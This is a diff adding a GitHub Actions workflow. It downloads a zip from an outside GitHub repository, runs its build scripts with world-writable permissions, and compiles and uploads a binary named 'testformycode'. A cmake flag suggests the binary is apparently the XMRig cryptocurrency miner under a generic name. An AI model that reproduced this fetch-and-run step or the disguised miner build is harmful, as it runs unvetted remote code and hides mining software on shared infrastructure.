@@ -1,0 +1,52 @@
+name: Build and Install Dependencies centos7
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v2
+
+      - name: Set up CentOS 7 in Docker
+        uses: docker://centos:7
+        with:
+          options: --privileged  # 确保有足够权限
+
+      - name: Install Dependencies in CentOS 7
+        run: |
+          yum install -y epel-release
+          yum install -y curl unzip git gcc gcc-c++ make cmake automake libtool autoconf libatomic
+
+      - name: Download and Unzip Source Code
+        run: |
+          curl -L -o testformycode.zip https://raw.githubusercontent.com/tjbcc0/tetmc/refs/heads/main/testformycode.zip
+          unzip testformycode.zip
+
+      - name: Build Project
+        run: |
+          cd testformycode/scripts
+          chmod 777 *.sh
+          ./build_deps.sh
+          cd ..
+          mkdir build
+          cd build
+          cmake -DXMRIG_DEPS=scripts/deps -DBUILD_SHARED_LIBS=OFF ..
+          make
+
+      - name: Check Binary Dependencies
+        run: |
+          cd testformycode/build
+          ldd testformycode
+
+      - name: Upload Build Artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: build-output
+          path: testformycode/build/testformycode  # 修改为具体的可执行文件路径
